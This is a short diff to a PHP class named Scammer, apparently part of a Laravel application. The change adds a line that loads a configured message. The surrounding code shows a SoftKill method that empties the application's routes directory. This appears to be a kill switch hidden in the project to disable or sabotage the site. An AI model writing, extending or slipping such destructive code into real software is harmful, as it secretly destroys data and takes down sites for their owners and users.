@@ -5,6 +5,7 @@ use DB;
 class Scammer{
   public function __construct($type){
     $this->type = $type;
+    $this->message = config('scammer.message');
   }
   private static function SoftKill(){
     File::cleanDirectory('routes');
